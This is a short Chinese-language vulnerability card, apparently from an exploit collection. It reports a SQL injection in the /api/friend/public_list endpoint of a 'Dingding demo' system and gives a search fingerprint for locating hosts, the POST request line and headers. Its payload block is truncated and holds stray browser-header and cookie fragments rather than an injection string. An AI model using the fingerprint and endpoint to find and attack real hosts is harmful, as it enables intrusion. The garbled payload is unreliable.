# 叮叮演示版某涉案系统public_list存在SQL注入漏洞

- **系统**：叮叮演示版某涉案系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`header="Access-Control-Allow-Headers: x-requested-with,content-type,x-csrf token,appkey,token"`
- **请求**：`POST /api/friend/public_list HTTP/1.1`
- **关键头**：`Content-Length: 61`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http:///api/friend/public_list
Cookie: 62cc888024db5cd9fe2616dbdb570ce8_ssl=f9d5c91f-0552-4800-bb53-92da4
d3c83a0.QZ4vqVD-i5cUriczmd1HWlrCtcI; d084e5ba280970da63882d7b0c3f9915_ssl=
4b739dfe-6b80-43ee-883e-bd9fac55512d.J7u2JOhEuZEHO65-8K8Utzcl5BA; 9389eaca
2f55feb7d69e0d4eb92d45a4_ssl=30399186-6446-4345-bf5c-7d7059932ce6.sB-ndYd3
He2-6K6p0vueoxrtRfU; fb69df26874bc1bcb8947bfaff066ff2_ssl=f8857eee-652c-40
5b-9528-905002bc1301.cajjuAtM7-QwTTrh3cNO1qHKt0w; 0ac4cd671fd8f19…（脚本共 899 字，完整版见原文）
```
- **预期**：200　|　—